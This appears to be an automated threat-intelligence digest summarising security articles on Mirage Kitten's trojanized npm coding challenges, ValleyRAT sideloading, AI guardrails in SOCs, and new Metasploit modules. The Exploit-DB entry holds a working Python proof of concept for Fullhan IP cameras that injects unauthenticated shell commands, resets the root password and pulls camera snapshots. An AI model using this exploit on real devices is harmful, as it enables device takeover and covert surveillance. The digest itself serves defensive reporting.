### Cluster 0a5e1245be — score 10

- Title: Mirage Kitten targeting aviation and FinTech sectors across the Middle East and Africa with a new malware set
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-09-01T07:00:26+00:00
- Link: https://securelist.com/mirage-kitten-new-backdoors-noderabbit-pollcat/121244/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng
- affected_industries: aviation_defense, financial_services
- affected_products: Apple iOS/macOS, npm
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, apt_espionage
- affected_industries: financial_services, aviation_defense
- affected_products: npm, Apple iOS/macOS
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Kaspersky researchers have discovered new Mirage Kitten attacks using previously undocumented malware families: NodeRabbit in Node.js and PollCat in JavaScript.
```

#### Full body

```
Table of Contents Background Initial access NodeRabbit RAT: the first variant NodeRabbit RAT: the second variant NodeRabbit RAT: the third variant 1. Malicious VS Code extension 2. Git hook injection PollCat RAT Infrastructure Victims Attribution Conclusions Indicators of compromise File hashes Domains and IPs Authors Omar Amin While monitoring Mirage Kitten activity, we uncovered a previously undocumented malware family that we dubbed NodeRabbit. We identified the first sample on a system in Afghanistan. Further threat hunting revealed two additional, more advanced, variants: one on a system in Egypt and another on a system in Ethiopia. NodeRabbit is a cross-platform remote access trojan (RAT) built with Node.js. It targets Windows, Linux, and macOS. Its operators deliver it through spear-phishing messages on LinkedIn and other job search platforms that contain trojanized coding challenge archives. During the same investigation, we discovered another previously undocumented malware family that we dubbed PollCat. Like NodeRabbit, PollCat is a cross-platform RAT, but it is written in obfuscated JavaScript also distributed through trojanized coding challenge archives. Mirage Kitten has historically relied on native malware written in languages such as C, C++, and Go, often deploying it through DLL search-order hijacking. NodeRabbit and PollCat represent the first publicly documented use of Node.js- and JavaScript-based malware by this APT group. Kaspersky’s products detect this threat as Trojan.JS.MirageKitten.* Background During recent threat research, we detected suspicious activity on a system in Afghanistan. We traced it to an archive containing a software development project that the user may have received during a job application process. The archive purported to contain a coding challenge for candidates applying for an engineering role. The archive, Front-Technical-Challenge.zip (MD5: 1EA83E4E4592B01E4ACAB63EB867BEE5 ), was hosted in an Amazon S3 bucket at: https://oracle-challenge.s3[.]us-east-1.amazonaws[.]com/Front-Technical-Challenge.zip It contained TaskFlow, an app for software engineering assessment built with Express, React, and Vite. The accompanying README instructed the candidate to review the application and fix defects in its frontend. It also claimed that server.js was bug-free and should not be modified, conveniently directing attention away from the only application source file the attackers had altered. README file for a trojanized coding challenge app The README also imposed a three-hour time limit and prohibited the use of AI assistants. Notably, an AI code-review assistant tasked with auditing the project would likely have flagged the suspicious first-line import of an unknown npm package and warned the targeted developer that the project was trojanized. Rules and time limit included in the trojanized coding challenge app README file The first line of server.js imported a trojanized npm package named colorized_terminal , version 2.1.0 . The attackers bundled the package directly in the challenge task archive’s node_modules directory rather than publishing it to the npm registry. When imported, the package silently launched an implant from node_modules/.cache/.320697f1/index.js as a detached background process. Retrospective threat hunting across our telemetry revealed the broader scope of the campaign. We identified three NodeRabbit variants with a shared code lineage; each was recovered from a system in a different country. The operators delivered the variants through similarly themed coding challenges and used two trojanized packages, colorized_terminal and pretty-log , both pinned to version 2.1.0 . The campaign also delivered PollCat, a second RAT with a substantially different structure, through a separate coding challenge lure. We’ll analyze PollCat later in this research. Initial access The infection chain begins with fake recruiter accounts contacting prospective targets on a job search platfor
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: Mirage Kitten targeting aviation and FinTech sectors across the Middle East and Africa with a new malware set
  - Published: 2026-09-01T07:00:26+00:00
  - Link: https://securelist.com/mirage-kitten-new-backdoors-noderabbit-pollcat/121244/
  - Summary: Kaspersky researchers have discovered new Mirage Kitten attacks using previously undocumented malware families: NodeRabbit in Node.js and PollCat in JavaScript.

### Cluster 6ffcd495ff — score 10

- Title: ValleyRAT masquerading as adware
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-08-31T10:00:21+00:00
- Link: https://securelist.com/valleyrat-backdoor-adware/121175/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Threat actors are distributing the ValleyRAT backdoor disguised as adware. We analyze the infection chain, from the malicious installer to the final payload.
```

#### Full body

```
Table of Contents Malicious installer DLL Sideloading via libcef.dll Running the malicious code ValleyRAT Targets and attribution Conclusion IoC MD5 Network Authors Pavel Bukhtenko Attackers typically try to pass off malware as legitimate applications or as potentially unwanted programs that users deliberately search for and download, such as cheats or cracks. They often rely on ad and affiliate networks to deliver their creations to victims’ devices. This post examines a less conventional case: a well-known backdoor distributed under the guise of adware. The attackers may have chosen this distribution method because the adware was signed by the developer. On top of that, users often manually add these apps to exclusions, so their useful features don’t get blocked. Some time ago, a client asked us to analyze a file with the MD5 hash c24e99f9437feacaa63766a3cde3fe3d and add it to our detection database. We initially classified it as adware, but a cursory analysis turned up suspicious network activity, which prompted us to dig deeper. It turned out the sample did far more than serve ads. In fact, its advertising functionality doesn’t even work; instead, it triggers an infection chain that delivers the ValleyRAT backdoor. Malicious installer The file the client shared with us turned out to be an installer that performed different actions depending on the two-letter suffix used in the file name, positioned just before the numeric string. Installer name What it does FS_SETUP_DD_173.exe Installs DingTalk, a workplace collaboration platform FS_SETUP_GG_173.exe Installs Google Chrome FS_SETUP_HY_173.exe Opens hxxps://meeting[.]tencent[.]com/download/ These actions are most likely designed to divert the user’s attention away from the sample’s malicious functionality. Regardless of the file name, the installer deploys a modified Chinese desktop wallpaper management tool called QN Wallpaper (hxxps://qnwallpaper[.]keansoft[.]cn/) and adds it to the registry’s autorun entries. The original version of QN Wallpaper is genuine adware: on installation, it delivers bundled partner apps to the device and then displays ad banners to the user. In this case, however, the attackers use it to carry out DLL sideloading , a technique that allows malicious code to run under the guise of a signed process by way of a malicious DLL. The QN Wallpaper modules, along with the malicious components, are unpacked to C:\Program Files\QNWallpaper\5.4.0.1662\<random string of letters and digits>. The following files are saved in that directory: File name MD5 Purpose 1.zip 7ad1e3ef4e6d9d636c9e7e967733850e Archive containing the adware files QnWallpeper.exe and QnwPlayer.exe, along with the modules needed to run them 7z.dll 96b4c1d0683dce22bd3223e1e40689c1 7z archiver library 7z.exe 9b86d3ab6cef15c633933fbbeab39c0a Archiver chrome_elf.dll edfdc30cbd85879776b8f735ea7de1f1 Library used to launch Electron-based applications libcef.dll 07ddbbe2c71c45577a7a4fbcdba0df91 Malicious library PeLoader 48826d5ca845979d2e6ebd66dc1aae90 File containing the encrypted backdoor QnWallpaper.exe 6c158c0f8e029342192d4f0d72e102b7 Adware module QnwPlayer.exe 9a71d6a41cd258b9e89cdc5fc224de73 Adware module <random string of letters and digits>Nedca.exe c24e99f9437feacaa63766a3cde3fe3d Malicious installer copy After unpacking, the installer uses the DisableAntiSpyware registry key to disable Windows Defender and then launches QnWallpaper.exe. Disabling Windows Defender DLL Sideloading via libcef.dll QnWallpaper.exe has dependencies in libcef.dll, so this library gets loaded when the process starts. QnWallpaper.exe also launches QnwPlayer.exe, which likewise calls libcef.dll. QnWallpaper and QnwPlayer won’t actually function correctly, because the functions exported from libcef.dll are put into an infinite sleep. However, in case that sleep is ever interrupted, the attackers have implemented a function that loads all the necessary functions from the original library into memory, provided it c
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: ValleyRAT masquerading as adware
  - Published: 2026-08-31T10:00:21+00:00
  - Link: https://securelist.com/valleyrat-backdoor-adware/121175/
  - Summary: Threat actors are distributing the ValleyRAT backdoor disguised as adware. We analyze the infection chain, from the malicious installer to the final payload.

### Cluster e3b723fac5 — score 10

- Title: This month in security with Tony Anscombe – August 2026 edition
- Source: ESET WeLiveSecurity (threat_research_primary)
- Published: 2026-08-31T08:55:00+00:00
- Link: https://www.welivesecurity.com/en/videos/month-security-tony-anscombe-august-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: aviation_defense, critical_infrastructure, financial_services
- affected_products: OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- affected_industries: financial_services, critical_infrastructure, aviation_defense
- affected_products: OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Details about the Hugging Face hack, critical infrastructure under attack, a spoofed in-flight Wi-Fi network, and more of this month's cybersecurity news
```

#### Full body

```
Video This month in security with Tony Anscombe – August 2026 edition Details about the Hugging Face hack, critical infrastructure under attack, a spoofed in-flight Wi-Fi network, and more of this month's cybersecurity news Editor 31 Aug 2026 With August coming to a close, it's time for ESET Chief Security Evangelist Tony Anscombe to look back at some of the top cybersecurity stories that have made the news over the past month. Here's some of what caught Tony's attention: OpenAI has disclosed more details about how its agents hacked AI collaboration platform Hugging Face. What exactly went wrong and what are the key lessons from the incident? Iran-linked hackers are believed to have attacked water and wastewater systems in at least 12 US states and even shut down a power plant in the UK for four days in July 2026 in a string of incidents that highlight risks facing critical infrastructure systems. Delta Airlines is investigating an incident where a flight passenger reportedly used an unidentified device to spoof the airline’s in-flight Wi-Fi network. Ukrainian authorities have shut down 94 fraudulent call centers in a large-scale crackdown targeting the operators behind scams that lured people into bogus investment schemes and attempted to steal access details into their bank accounts. What are the lessons that businesses and critical infrastructure services should take away from these news stories? Watch the video to get answers to this and other questions, and be sure to also check out the July 2026 edition of Tony's monthly security news roundup for more insights.. Connect with us on Facebook , X , LinkedIn and Instagram . Let us keep you up to date Sign up for our newsletters Related Articles Video This month in security with Tony Anscombe – July 2026 edition Video This month in security with Tony Anscombe – July 2026 edition Video This month in security with Tony Anscombe – June 2026 edition Video This month in security with Tony Anscombe – June 2026 edition Video This month in security with Tony Anscombe – May 2026 edition Video This month in security with Tony Anscombe – May 2026 edition Similar Articles Business Security Black Hat USA 2026: What the Hugging Face hack tells us about human responsibility Business Security Black Hat USA 2026: AI is racing ahead of cybersecurity controls Share Article Discussion
```

#### Corroborating sources (1)

- **ESET WeLiveSecurity** (threat_research_primary)
  - Title: This month in security with Tony Anscombe – August 2026 edition
  - Published: 2026-08-31T08:55:00+00:00
  - Link: https://www.welivesecurity.com/en/videos/month-security-tony-anscombe-august-2026/
  - Summary: Details about the Hugging Face hack, critical infrastructure under attack, a spoofed in-flight Wi-Fi network, and more of this month's cybersecurity news

### Cluster 53ffa01d60 — score 10

- Title: “Sorry, I can’t help with that”: How your guardrails might become the attacker’s best friend
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-08-27T18:00:24+00:00
- Link: https://blog.talosintelligence.com/sorry-i-cant-help-with-that-how-your-guardrails-might-become-the-attackers-best-friend/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
In his first Threat Source newsletter, David Bianco explores the critical need for operational sovereignty in customizing AI guardrails to maintain the defender’s advantage.
```

#### Full body

```
“Sorry, I can’t help with that”: How your guardrails might become the attacker’s best friend By David J. Bianco Thursday, August 27, 2026 14:00 Threat Source newsletter Welcome to this week’s edition of the Threat Source newsletter. Hello, everyone. Long time reader, first time writer here at the Threat Source newsletter! I wanted to start out by introducing myself. My colleague and friend Mick Baccio set the bar pretty high last week , so I was planning to tell you all about myself, including: How I did my first real IR under the influence of The Cuckoo’s Egg while an undergraduate (and failed) My pre-bug bounty flirtation with vulnerability research, including an arbitrary file overwrite in biff(1) and how I once hacked MIT’s website My first ever hands-on experience with a computer, the display demo Commodore 64 at the Montgomery Ward Unfortunately, my editor says we don’t have the “space” for that, the MIT thing might open me up to “liability,” and it’s not the kind of “professional image” we strive for here at Talos. (I'm watching. Always watching. -Amy) So instead, I’ll just play it safe and say that I’ve been in the security field for a little over 30 years now, mostly concentrating on the defensive side (Go, Team Blue!). I’ve helped set up SOCs, run threat hunting teams, and even published a few things you might have heard of . Speaking of things I’ve published, I’ve written before about the Attacker’s Dilemma . The idea that defenders have inherent advantages over attackers runs contrary to what most of us have heard throughout our careers. An attacker must evade monitoring and technical controls at every step of their attack lifecycle, because the defender only needs to notice once in order to respond and prevent them from achieving their goal. This is one of the most important advantages of any security team has, but we are currently witnessing a self-imposed erosion of this advantage through the rise of poorly-designed AI guardrails. I’m not opposed to guardrails, but we have to carefully consider what we’re guarding against and where we deploy them. As I explored in a recent piece on The Safety Penalty , by allowing third-party AI providers to implement and control safety filters and the policies behind them, we may in fact be helping the attacker. If agentic SOC process experience refusals, it can slow or even halt investigations. Of course, these should get flagged for human intervention, but that takes time and may give the attacker breathing room in which to complete their mission. It may turn out that the where of the guardrails is even more important than the what . Operational sovereignty relies on having control of our own limits. Any vision of an agentic SOC must allow the security teams to customize the guardrails according to their own threat model. They should also have the flexibility to temporarily remove specific safeguards under authorized circumstances, something you won’t get with guardrails from a frontier provider. These controls belong inside your organization’s agentic harness where you can set the policies and technical controls to allow you to analyze threats while ensuring your agents stay within their lanes. Ultimately, operational sovereignty means engaging with the reality of the threat landscape, ensuring that the adversary can’t derail the defender’s investigation and response processes, either accidentally or intentionally. We need to move toward a model where each organization can choose the guardrails that work for them, rather than having inflexible guardrails chosen for them. The one big thing Cisco Talos recently evaluated 66 large language model (LLM) and reasoning combinations to see if we could find a clear winner for security operations. Instead, we found that selecting the right model is a complex balancing act between efficacy, speed, cost, and consistency. Cranking up a model's reasoning effort doesn't guarantee better analysis and can actually degrade performance. Ultima
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: “Sorry, I can’t help with that”: How your guardrails might become the attacker’s best friend
  - Published: 2026-08-27T18:00:24+00:00
  - Link: https://blog.talosintelligence.com/sorry-i-cant-help-with-that-how-your-guardrails-might-become-the-attackers-best-friend/
  - Summary: In his first Threat Source newsletter, David Bianco explores the critical need for operational sovereignty in customizing AI guardrails to maintain the defender’s advantage.

### Cluster 8f89f1c57c — score 10

- Title: The Agentic SOC – From AI Theater to Real Defense
- Source: Recorded Future (threat_research_primary)
- Published: 2026-09-01T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/agentic-soc-real-defense
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ai_security
- affected_industries: legal_professional
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ai_security
- affected_industries: legal_professional
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Experts from Recorded Future and Accenture offer perspectives on navigating the path to becoming an agentic SOC. Find out how to plan moving beyond “AI theater” by prioritizing measurable KPIs, proactively mitigating autonomous security risks, and evolving the analyst’s role from managing alerts to managing agents.
```

#### Full body

```
The Agentic SOC – From AI Theater to Real Defense Moving beyond "AI theater" with measurable KPIs: Security teams must distinguish between genuine value and "productivity theater." Success requires defining concrete KPIs—such as cost improvement, risk reduction, and speed—to measure true ROI, rather than deploying AI tools without a clear strategic purpose. Mitigate new autonomous risks: The shift to an agentic SOC introduces distinct threats, such as indirect prompt injection, and creates visibility gaps that traditional SIEM platforms are not built to handle. Organizations should shift from post-event observability to proactive control mechanisms, such as placing strict constraints on agent compute and communication. Redefine the analyst’s role for speed at scale: As defensive timelines compress from days to seconds, the fundamental unit of work will evolve from alert handling to agent management. The human role is shifting from a manual processor to an architect, responsible for setting objectives, defining operational constraints, and overseeing the behavior of AI agents. For security teams, AI has generated both more excitement and more confusion than any technology in the last decade. As threat actors experiment with AI to hone their attacks, defenders are trying to determine which AI investments will help them measurably reduce risk. Matthew Farmer, Accenture’s Managing Director of Security Operations in EMEA, joined Recorded Future’s co-founder Christopher Ahlberg and CTO and co-founder Staffan Truvé in a recent discussion to discuss the agentic SOC and what it takes to move from “AI theater” to real defense. Read on to see the key highlights from the discussion. Avoiding the "productivity theater" trap While AI is demonstrably transforming investigation and decision-making layers in SecOps, there’s a significant risk that organizations are falling into what Farmer calls "AI productivity theater." "We can all agree that there's great production value around a lot of AI capabilities and AI products," he said. "But there are also organizations that are really struggling to achieve any kind of return on investment on their AI.” The panel noted that the difference between success and failure doesn’t necessarily have anything to do with being in a regulated or non-regulated industry. It’s more about the ability to move past the theater by defining concrete KPIs. “A lot of what people want to achieve with AI, we can already achieve with existing machine learning or SOAR automation capabilities,” Farmer said. So rather than simply deploying an AI solution for the sake of being AI-enabled, organizations need to ask whether they’re solving for cost improvement, risk reduction, or speed. They need to understand their KPIs so they can measure their true ROI. Navigating technical and operational challenges When it comes to bringing new AI solutions online, the panel noted that SOCs often face administrative, legal, and compliance limitations that eclipse any technical hurdles. They also agreed that data quality and lack of context — “two sides of the same coin” according to Truvé — remain fundamental challenges. Farmer noted that, “In the new world of tokenomics, it costs just as much money to troll through poor quality data as high-quality data.” It’s essential that security organizations feed only the best intelligence into their AI tools. Assessing new risks, from democratization to agentic threats Farmer said that security organizations used to ask a key question: “Do those [threat actors] with the capability have the motive, and do those with the motive have the capability?” We’re now in a world where non-capable threat actors can use AI to capably launch highly sophisticated attacks. Threats are also becoming more structural. The panel highlighted "indirect prompt injection"—where agents are manipulated by the very instructions they read—as a new, distinct threat vector. As companies deploy a digital workforce of AI agents,
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: The Agentic SOC – From AI Theater to Real Defense
  - Published: 2026-09-01T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/agentic-soc-real-defense
  - Summary: Experts from Recorded Future and Accenture offer perspectives on navigating the path to becoming an agentic SOC. Find out how to plan moving beyond “AI theater” by prioritizing measurable KPIs, proactively mitigating autonomous security risks, and evolving the analyst’s role from managing alerts to managing agents.

### Cluster 14562e0782 — score 10

- Title: CTEM Is Not About the Stages. It’s About the Outcome.
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-09-02T13:11:00+00:00
- Link: https://horizon3.ai/intelligence/blogs/ctem-outcome-not-stages/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
CTEM is not about filling five technology boxes. It is about continuously reducing exploitable exposure, proving remediation worked, and measuring whether the environment is becoming harder to attack.
```

#### Full body

```
CTEM Is Not About the Stages. It’s About the Outcome. Stephen Gates September 2, 2026 Blogs Continuous Threat Exposure Management (CTEM) has a five-stage framework. That does not mean you need five technologies. Yet much of the conversation around CTEM is heading in that direction. Vendors and practitioners increasingly try to map technologies to each stage, assigning products to Scoping, Discovery, Prioritization, and Validation, while treating Mobilization as a problem for workflow and orchestration. Before long, CTEM starts looking like an architecture diagram with five boxes that security teams are expected to fill. That misses the point. CTEM is ultimately about one outcome: continuously reducing exposure. The stages help organize the program. They are not the outcome. The Framework Is Not a Technology Architecture Gartner® defines CTEM through these five stages: Scoping → Discovery → Prioritization → Validation → Mobilization Look at the bookends: Scoping and Mobilization. Scoping starts with organizational decisions about what matters to the business, what should be in scope, and which systems, processes, identities, applications, and potential impacts deserve attention. Mobilization is about getting people to act. Security can provide evidence, guidance, and recommendations, but someone still has to own the problem, decide what to do, implement the change, and manage the operational consequences. Technology supports both, but neither is simply a technology problem. The question isn’t whether you have technology mapped to every CTEM stage. The question is: Are we continuously reducing the exposures attackers can use against us? That changes how you think about the entire program. More Visibility Isn’t the Same as Less Exposure Most organizations already have vulnerability scanners, EASM, CSPM, threat intelligence, risk scoring, identity tooling, endpoint controls, ticketing systems, and remediation workflows generating enormous amounts of information about exposure. The problem is turning that information into action. Discovery illustrates the challenge. A mature security program can identify enormous numbers of vulnerabilities, misconfigurations, exposed assets, identity risks, and other potential weaknesses. You need that coverage to understand where exposure might exist, but more visibility does not automatically create more understanding. A vulnerability can have a critical severity score and still be difficult or impossible to exploit in a particular environment. Another issue that appears relatively unimportant on its own may become consequential when combined with a weak credential, excessive privilege, a misconfiguration, or another weakness. Visibility tells you what could be a problem. It doesn’t tell you what an attacker can actually do. That’s why exposure management can’t stop at discovery. Validation Changes the Conversation Security teams have spent years trying to improve prioritization with better signals, including severity scores, threat intelligence, asset criticality, Known Exploited Vulnerabilities, exploit prediction, and business context. These signals are valuable because they help teams decide where to focus. But they are still signals. Validation adds evidence. Can the weakness actually be exploited in your environment? Can multiple weaknesses be chained together? Can an attacker move laterally or escalate privileges? Can they reach sensitive systems or data? Do the controls expected to stop the attack actually work? Once you know those answers, prioritization becomes less subjective. You’re no longer deciding solely on what might create risk. You have evidence showing what an attacker can actually achieve. The backlog can shrink accordingly, allowing teams to focus on validated exposures based on the criticality of affected systems, access gained, ability to move laterally, and potential impact to data, operations, or customers. Validation turns exposure data into evidence for action. Finding
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: CTEM Is Not About the Stages. It’s About the Outcome.
  - Published: 2026-09-02T13:11:00+00:00
  - Link: https://horizon3.ai/intelligence/blogs/ctem-outcome-not-stages/
  - Summary: CTEM is not about filling five technology boxes. It is about continuously reducing exploitable exposure, proving remediation worked, and measuring whether the environment is becoming harder to attack.

### Cluster bb1555be83 — score 10

- Title: [hardware] Fullhan FH8626V100 - Multiple Vulnerabilities
- Source: Exploit-DB (offensive_vulnerability_research)
- Published: 2026-09-02T00:00:00+00:00
- Link: https://www.exploit-db.com/exploits/52674
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-51402, CVE-2026-51403, CVE-2026-51404, CVE-2026-51405, CVE-2026-51406
- urgency_signals: poc_available, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- cve_ids: CVE-2026-51402, CVE-2026-51403, CVE-2026-51404, CVE-2026-51405, CVE-2026-51406
- urgency_signals: preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Fullhan FH8626V100 - Multiple Vulnerabilities
```

#### Full body

```
Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training Fullhan FH8626V100 - Multiple Vulnerabilities EDB-ID: 52674 CVE: 2026-51407 2026-51406 2026-51405 2026-51404 2026-51403 2026-51402 EDB Verified: Author: Amir Aliu Type: hardware Exploit: / Platform: Multiple Date: 2026-09-02 Vulnerable App: # Exploit Title: Fullhan FH8626V100 - Multiple Vulnerabilities # Date: 31-03-2026 # Exploit Author: Amir Aliu # Vendor Homepage: https://www.fullhan.com/ # Software Link: N/A - OEM/whitelabel IP camera module, rebranded under numerous vendor/brand names # Version: Firmware v201222.1007 (Device Model AJL30PG0803) # Tested on: FH8626V100 SoC (Fullhan FH86xx family), AJL30PG0803 device, BusyBox v1.19.3, embedded Linux (ARM) # CVE: CVE-2026-51402, CVE-2026-51403, CVE-2026-51404, CVE-2026-51405, CVE-2026-51406, CVE-2026-51407 # Blog: https://amiraliu.vercel.app/blog/breaking-into-my-own-camera # Source: https://github.com/amiraliuks/ip-camera-research # Summary A range of rebranded IP cameras built on the Fullhan FH8626V100 SoC and shipped with the "CareCam Pro" app expose a chain of vulnerabilities that lead to full device compromise. - CVE-2026-51402: TCP/1300 accepts <SYSTEM>...</SYSTEM>-wrapped shell commands with no authentication (blind OS command injection, CWE-78). - CVE-2026-51403: The PSIA HTTP API (/PSIA/*) allows unauthenticated read/write access to device and network configuration (CWE-306/CWE-284). - CVE-2026-51404: An unauthenticated JPEG snapshot is served on TCP/6688 (CWE-200). - CVE-2026-51405: BusyBox telnetd is enabled by default via inetd, exposing a root shell to anyone holding valid credentials (CWE-287). - CVE-2026-51406: /PSIA/Security/AAA/users discloses the admin username and password in plaintext with no authentication (CWE-522). - CVE-2026-51407: Once shell access is obtained, /app/userdata/ifcfg.wlan0 stores the configured Wi-Fi SSID/password in plaintext (CWE-319). # Exploitation Chain The command injection (CVE-2026-51402) is used to reset the root password, which is then used to authenticate to the always-on Telnet service (CVE-2026-51405), yielding a full root shell with no valid credentials required at any point. # Proof of Concept (PoC) [Full Chain] import socket import requests import sys import os TARGET = None NEW_PASSWORD = "root" # Helpers def send_system(cmd, port): """Send <SYSTEM> command to target""" payload = f"<SYSTEM>{cmd}</SYSTEM>" try: with socket.socket() as s: s.settimeout(3) s.connect((TARGET, port)) s.send(payload.encode()) data = s.recv(1024).decode() return data except Exception: return None def check_port(port): """Simple TCP check""" try: with socket.socket() as s: s.settimeout(2) s.connect((TARGET, port)) return True except: return False # Checks def check_rce(port): print(f"[.] Checking RCE on port {port}...") res = send_system("ls", port) if res and "<SYSTEM_ACK>ok</SYSTEM_ACK>" in res: print(f"[+] RCE available on port {port}") return True else: print(f"[-] Port {port} not vulnerable") return False def check_telnet(): print("[.] Checking telnet (port 23)...") if check_port(23): print("[+] Telnet is open") return True else: print("[-] Telnet is closed") return False def get_snapshot(save=False): print("[.] Fetching snapshot...") try: r = requests.get(f"http://{TARGET}:6688/snapshot.jpg", timeout=5) if r.status_code == 200: if save: with open("snapshot.jpg", "wb") as f: f.write(r.content) print("[+] snapshot.jpg saved") return r.content else: print("[-] Failed to get snapshot") return None except Exception: print("[-] Request failed") return None def show_snapshot(): data = get_snapshot(save=False) if not data: return tmp_file = "/tmp/snapshot.jpg" with open(tmp_file, "wb") as f: f.write(data) print("[+] Opening snapshot...") os.system(f"xdg-open {tmp_file}") # Exploit def reset_root_password(): print("[+] Changing root password...") res = send_system(f'echo "root:{NEW_PASSWORD}" | chpasswd', 1300) print(f"[+] Response: {res}") if
```

#### Corroborating sources (1)

- **Exploit-DB** (offensive_vulnerability_research)
  - Title: [hardware] Fullhan FH8626V100 - Multiple Vulnerabilities
  - Published: 2026-09-02T00:00:00+00:00
  - Link: https://www.exploit-db.com/exploits/52674
  - Summary: Fullhan FH8626V100 - Multiple Vulnerabilities

### Cluster f5aaf423ba — score 10

- Title: Metasploit Wrap Up: Payloads and Exploits, and Scanners, Oh my!
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-08-28T14:57:18+00:00
- Link: https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-payloads-exploits-scanners
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: manufacturing_industrial
- affected_products: Drupal, Palo Alto Networks, WordPress
- cve_ids: CVE-2026-0265, CVE-2026-3576, CVE-2026-59774, CVE-2026-6826, CVE-2026-9082
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- affected_industries: manufacturing_industrial
- affected_products: Drupal, Palo Alto Networks, WordPress
- cve_ids: CVE-2026-59774, CVE-2026-3576, CVE-2026-6826, CVE-2026-9082, CVE-2026-0265
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Full body

```
Back to Blog Products and Tools Metasploit Wrap Up: Payloads and Exploits, and Scanners, Oh my! The Metasploit Team Aug 28, 2026 | Last updated on Aug 28, 2026 | 8 min read This release has something for everyone: scanner modules, payloads, and exploits. This release’s scanners cover Drupal, PanOS, WordPress, and SCADA; this release’s exploits cover Tenable, Flowise, CheckPoint, Langflow, Ruby, and SPIP. New module content (16) Forgejo Arbitrary File Read via Org-mode Include Authors: NightRang3r and xbow-security Type: Auxiliary Pull request: #21778 contributed by jvoisin Path: gather/forgejo_orgmode_fileread_cve_2026_59774 Description: Adds module targeting CVE-2026-59774, an arbitrary file read in Forgejo 7.0 through 15.0.5 and 16.0.0–16.0.1. Wordpress Planyo Online Reservation System Arbitrary File Read (CVE-2026-3576) Authors: Balachandar Gowrisankar and sinn3r [email protected] Type: Auxiliary Pull request: #21769 contributed by anirbala98 Path: gather/wp_planyo_lfi_cve_2026_3576 Description: This adds a module for, CVE-2026-3576, a local file inclusion vulnerability via server side request forgery in WordPress's Planyo Online Reservation System plugin (versions < 3.1). The plugin's AJAX proxy ulap.php does not validate the scheme of URLs supplied to it. This allows unauthenticated attackers to supply file:// URLs to ulap.php and retrieve any arbitrary local file contents from the target. Concrete CMS Unauthenticated File Usage Disclosure Author: dividesbyzer0 Type: Auxiliary Pull request: #21695 contributed by zoomdbz Path: scanner/http/concrete_cms_file_usage_disclosure Description: Adds an auxiliary scanner module for CVE-2026-6826: Concrete CMS 9.x before 9.5.1 exposes the file usage dialog controller at /ccm/system/dialogs/file/usage/ <fID> without a view permission check. Drupal Core PostgreSQL EntityQuery SQL Injection Author: Lukas Johannes Moeller Type: Auxiliary Pull request: #21765 contributed by JohannesLks Path: scanner/http/drupal_pgsql_entityquery_sqli Description: This adds a new module: drupal_pgsql_entityquery_sqli for CVE-2026-9082, an unauthenticated SQL injection in Drupal core's PostgreSQL EntityQuery condition handler. The module confirms the injection using the framework's PostgreSQL time-based blind SQLi implementation. PAN-OS GlobalProtect CAS CVE-2026-0265 Vulnerability Checker Authors: Bishop Fox Team X and Rapid7 Research / Deral Heiland adaptation Type: Auxiliary Pull request: #21610 contributed by percx Path: scanner/http/panos_cve_2026_0265 Description: Adds a new Metasploit auxiliary scanner module for safely detecting CVE-2026-0265 affecting PAN-OS GlobalProtect portals when Clientless Application Services (CAS) authentication is enabled. WordPress Core wp2shell Unauthenticated SQL Injection via REST Batch Route Confusion Authors: 